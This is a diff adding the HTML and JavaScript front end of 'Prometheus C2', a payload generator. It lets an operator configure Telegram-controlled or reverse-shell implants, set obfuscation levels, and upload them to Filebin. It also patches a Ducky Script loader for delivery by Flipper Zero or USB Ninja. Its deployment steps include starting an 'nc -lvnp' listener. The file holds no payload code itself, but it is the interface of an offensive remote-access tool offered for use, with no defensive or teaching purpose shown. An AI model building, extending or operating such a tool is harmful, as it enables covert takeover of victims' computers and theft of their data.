@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prometheus C2 | Generator</title>
+    <style>
+        /* RESET & BASE */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #000000; /* чистый чёрный */
+            color: #cccccc; /* серый */
+            min-height: 100vh;
+            padding: 20px;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        /* LAYOUT */
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #1a1a1a; /* тёмно-серый */
+            border: 1px solid #ff0000; /* чистый красный */
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #ff0000;
+        }
+        
+        .header h1 {
+            color: #ff0000; /* чистый красный */
+            font-size: 24px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .header .subtitle {
+            color: #cccccc; /* серый */
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        /* FORM SECTIONS */
+        .form-section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #000000; /* чистый чёрный */
+            border-left: 3px solid #ff0000;
+        }
+        
+        .form-section h2 {
+            color: #cccccc; /* серый */
+            margin-bottom: 15px;
+            font-size: 16px;
+            text-transform: uppercase;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #cccccc; /* серый */
+            font-weight: bold;
+            font-size: 13px;
+        }
+        
+        select, input[type="text"], input[type="number"], input[type="file"] {
+            width: 100%;
+            padding: 8px 10px;
+            background: #000000; /* чистый чёрный */
+            border: 1px solid #333333; /* тёмно-серый */
+            color: #cccccc; /* серый */
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        
+        select:focus, input:focus {
+            outline: none;
+            border-color: #ff0000; /* чистый красный */
+        }
+        
+        small {
+            color: #666666;
+            font-size: 11px;
+            display: block;
+            margin-top: 3px;
+        }
+        
+        /* CONDITIONAL SECTIONS */
+        .conditional-section {
+            display: none;
+        }
+        
+        /* BUTTONS */
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: #000000; /* чистый чёрный */
+            color: #ff0000; /* чистый красный */
+            border: 1px solid #ff0000;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: #ff0000; /* чистый красный */
+            color: #000000; /* чистый чёрный */
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        /* LOADER */
+        .loader-container {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: #000000;
+            border: 1px solid #ff0000;
+        }
+        
+        .loader {
+            border: 2px solid #333333;
+            border-top: 2px solid #ff0000;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* RESULTS */
+        .result-container {
+            display: none;
+            padding: 20px;
+            background: #000000;
+            border: 1px solid #ff0000;
+            margin-top: 20px;
+        }
+        
+        .result-success {
+            color: #ff0000;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        .result-url {
+            background: #1a1a1a;
+            padding: 10px;
+            margin: 15px 0;
+            border: 1px solid #333333;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            color: #cccccc;
+        }
+        
+        .copy-btn {
+            background: #000000;
+            color: #cccccc;
+            border: 1px solid #333333;
+            margin-bottom: 15px;
+        }
+        
+        .copy-btn:hover {
+            background: #333333;
+            color: #ffffff;
+        }
+        
+        /* ALERTS */
+        .alert {
+            padding: 10px;
+            margin-bottom: 15px;
+            display: none;
+            border: 1px solid;
+            font-size: 12px;
+        }
+        
+        .alert-error {
+            background: #000000;
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+        
+        .alert-success {
+            background: #000000;
+            border-color: #00ff00;
+            color: #00ff00;
+        }
+        
+        /* FILE UPLOAD */
+        .file-upload {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .file-upload input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+        
+        .file-upload-label {
+            display: block;
+            padding: 8px 10px;
+            background: #000000;
+            border: 1px dashed #333333;
+            color: #cccccc;
+            text-align: center;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        
+        .file-upload-label:hover {
+            border-color: #ff0000;
+        }
+        
+        .file-upload-label.has-file {
+            border-color: #00ff00;
+            color: #00ff00;
+        }
+        
+        .file-name {
+            margin-top: 5px;
+            font-size: 11px;
+            color: #666666;
+            text-align: center;
+        }
+        
+        /* UTILITY */
+        .code {
+            font-family: monospace;
+            background: #000000;
+            padding: 2px 4px;
+            border: 1px solid #333333;
+            color: #cccccc;
+            font-size: 12px;
+        }
+        
+        /* MOBILE */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                padding: 15px;
+            }
+            
+            .header h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>PROMETHEUS C2</h1>
+            <p class="subtitle">Payload Generator v1.0</p>
+        </div>
+        
+        <div class="alert" id="alertBox"></div>
+        
+        <form id="generatorForm">
+            <!-- Section 1: Payload -->
+            <div class="form-section">
+                <h2>1. Payload Configuration</h2>
+                
+                <div class="form-group">
+                    <label for="payload_type">Payload Type:</label>
+                    <select id="payload_type" name="payload_type" required onchange="toggleSections()">
+                        <option value="">-- Select --</option>
+                        <option value="better_tg">Telegram C2 (Advanced)</option>
+                        <option value="tg_shell">Telegram Shell (Basic)</option>
+                        <option value="standart">Reverse Shell (Standard)</option>
+                        <option value="advanced">Reverse Shell (Advanced)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="encryption_level">Encryption Level (0-5):</label>
+                    <input type="number" id="encryption_level" name="encryption_level" 
+                           min="0" max="5" value="5" required>
+                    <small>0=Random, 1=Low, 2=Medium, 3=High, 4=Higher, 5=Insane</small>
+                </div>
+            </div>
+            
+            <!-- Section 2: Telegram -->
+            <div class="form-section conditional-section" id="telegramSection">
+                <h2>2. Telegram Configuration</h2>
+                
+                <div class="form-group">
+                    <label for="telegram_token">Bot Token:</label>
+                    <input type="text" id="telegram_token" name="telegram_token" 
+                           placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz">
+                </div>
+                
+                <div class="form-group">
+                    <label for="chat_id">Chat ID:</label>
+                    <input type="text" id="chat_id" name="chat_id" 
+                           placeholder="123456789">
+                </div>
+            </div>
+            
+            <!-- Section 3: Reverse Shell -->
+            <div class="form-section conditional-section" id="reverseShellSection">
+                <h2>2. Reverse Shell Configuration</h2>
+                
+                <div class="form-group">
+                    <label for="local_ip">Local IP:</label>
+                    <input type="text" id="local_ip" name="local_ip" 
+                           placeholder="192.168.1.100">
+                    <small>Auto-detected if empty</small>
+                </div>
+                
+                <div class="form-group">
+                    <label for="listener_port">Listener Port:</label>
+                    <input type="text" id="listener_port" name="listener_port" 
+                           placeholder="4444">
+                </div>
+            </div>
+            
+            <!-- Section 4: Loader -->
+            <div class="form-section">
+                <h2>3. Loader File</h2>
+                <p style="margin-bottom: 10px; color: #666;">Select Ducky Script to update:</p>
+                
+                <div class="form-group">
+                    <div class="file-upload">
+                        <input type="file" id="loader_file" name="loader_file" 
+                               accept=".txt" onchange="updateFileName(this)">
+                        <label for="loader_file" class="file-upload-label" id="fileLabel">
+                            [UPLOAD] stealth_loader.txt or main_loader.txt
+                        </label>
+                    </div>
+                    <div class="file-name" id="fileName"></div>
+                    <small>Optional. URL will be inserted automatically.</small>
+                </div>
+            </div>
+            
+            <!-- Generate -->
+            <button type="submit" class="btn" id="generateBtn">
+                [ GENERATE PAYLOAD ]
+            </button>
+        </form>
+        
+        <!-- Loading -->
+        <div class="loader-container" id="loaderContainer">
+            <div class="loader"></div>
+            <p>Generating payload...</p>
+            <p style="color: #666; font-size: 11px;">Encrypting with Chimera & uploading to Filebin</p>
+        </div>
+        
+        <!-- Results -->
+        <div class="result-container" id="resultContainer">
+            <div class="result-success">[ SUCCESS ] Payload Generated</div>
+            
+            <div class="form-section">
+                <h3>Payload Info</h3>
+                <p><strong>Type:</strong> <span id="resultType"></span></p>
+                <p><strong>Encryption:</strong> <span id="resultEL"></span></p>
+                <p><strong>Time:</strong> <span id="resultTime"></span></p>
+            </div>
+            
+            <div class="form-section">
+                <h3>Download URL</h3>
+                <div class="result-url" id="resultUrl"></div>
+                <button class="btn copy-btn" onclick="copyToClipboard()">[ COPY URL ]</button>
+            </div>
+            
+            <div id="loaderResultSection" style="display: none;">
+                <div class="form-section">
+                    <h3>Updated Loader</h3>
+                    <p>Ducky Script updated with payload URL.</p>
+                    <a class="btn" id="downloadLink" download style="text-decoration: none;">[ DOWNLOAD LOADER.TXT ]</a>
+                </div>
+            </div>
+            
+            <div class="form-section">
+                <h3>Deployment</h3>
+                <ol style="padding-left: 20px; margin-top: 10px; font-size: 12px;">
+                    <li>Copy URL above</li>
+                    <li>Telegram: Execute & send commands via bot</li>
+                    <li>Reverse: Start <span class="code">nc -lvnp [PORT]</span></li>
+                    <li>Use Flipper Zero / USB Ninja with loader</li>
+                </ol>
+            </div>
+            
+            <button class="btn" onclick="resetForm()">[ NEW PAYLOAD ]</button>
+        </div>
+    </div>
+    
+    <script>
+        // XSS Protection - Escape HTML
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Toggle sections
+        function toggleSections() {
+            const payloadType = document.getElementById('payload_type').value;
+            document.getElementById('telegramSection').style.display = 
+                (payloadType === 'better_tg' || payloadType === 'tg_shell') ? 'block' : 'none';
+            document.getElementById('reverseShellSection').style.display = 
+                (payloadType === 'standart' || payloadType === 'advanced') ? 'block' : 'none';
+        }
+
+        // File name update
+        function updateFileName(input) {
+            const fileNameDiv = document.getElementById('fileName');
+            const fileLabel = document.getElementById('fileLabel');
+            
+            if (input.files.length > 0) {
+                const fileName = escapeHtml(input.files[0].name);
+                fileNameDiv.textContent = `Selected: ${fileName}`;
+                fileLabel.classList.add('has-file');
+                fileLabel.textContent = `[UPLOADED] ${fileName}`;
+            } else {
+                fileNameDiv.textContent = '';
+                fileLabel.classList.remove('has-file');
+                fileLabel.textContent = '[UPLOAD] stealth_loader.txt or main_loader.txt';
+            }
+        }
+
+        // Alerts
+        function showAlert(message, type = 'error') {
+            const alertBox = document.getElementById('alertBox');
+            alertBox.textContent = message;
+            alertBox.className = `alert alert-${type}`;
+            alertBox.style.display = 'block';
+            
+            if (type === 'success') {
+                setTimeout(() => alertBox.style.display = 'none', 5000);
+            }
+        }
+
+        // Copy to clipboard
+        function copyToClipboard() {
+            const urlElement = document.getElementById('resultUrl');
+            const text = urlElement.textContent;
+            
+            navigator.clipboard.writeText(text).then(() => {
+                showAlert('URL copied to clipboard', 'success');
+            }).catch(err => {
+                showAlert('Copy failed: ' + err, 'error');
+            });
+        }
+
+        // Reset form
+        function resetForm() {
+            document.getElementById('generatorForm').reset();
+            document.getElementById('loader_file').value = '';
+            document.getElementById('fileName').textContent = '';
+            document.getElementById('fileLabel').className = 'file-upload-label';
+            document.getElementById('fileLabel').textContent = '[UPLOAD] stealth_loader.txt or main_loader.txt';
+            
+            document.getElementById('loaderContainer').style.display = 'none';
+            document.getElementById('resultContainer').style.display = 'none';
+            document.getElementById('generatorForm').style.display = 'block';
+            
+            toggleSections();
+        }
+
+        // Form submission
+        document.getElementById('generatorForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const form = e.target;
+            const formData = new FormData(form);
+            const payloadType = formData.get('payload_type');
+            
+            if (!payloadType) {
+                showAlert('Select payload type', 'error');
+                return;
+            }
+            
+            // Show loader
+            document.getElementById('loaderContainer').style.display = 'block';
+            document.getElementById('generatorForm').style.display = 'none';
+            document.getElementById('alertBox').style.display = 'none';
+            
+            try {
+                const response = await fetch('/generate', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                // Hide loader
+                document.getElementById('loaderContainer').style.display = 'none';
+                
+                if (data.success) {
+                    // Set results - ESCAPE ALL DATA
+                    document.getElementById('resultType').textContent = escapeHtml(payloadType);
+                    document.getElementById('resultEL').textContent = escapeHtml(formData.get('encryption_level'));
+                    document.getElementById('resultTime').textContent = new Date().toLocaleTimeString();
+                    document.getElementById('resultUrl').textContent = escapeHtml(data.download_url);
+                    
+                    // Loader file
+                    if (data.loader_file) {
+                        document.getElementById('loaderResultSection').style.display = 'block';
+                        document.getElementById('downloadLink').href = data.loader_download;
+                        document.getElementById('downloadLink').download = escapeHtml(data.loader_file);
+                    } else {
+                        document.getElementById('loaderResultSection').style.display = 'none';
+                    }
+                    
+                    // Show results
+                    document.getElementById('resultContainer').style.display = 'block';
+                    showAlert('Payload generated successfully', 'success');
+                } else {
+                    // Show error
+                    document.getElementById('generatorForm').style.display = 'block';
+                    showAlert(escapeHtml(data.error || 'Unknown error'), 'error');
+                }
+                
+            } catch (error) {
+                document.getElementById('loaderContainer').style.display = 'none';
+                document.getElementById('generatorForm').style.display = 'block';
+                showAlert('Network error: ' + escapeHtml(error.message), 'error');
+            }
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            toggleSections();
+        });
+    </script>
+</body>
+</html>
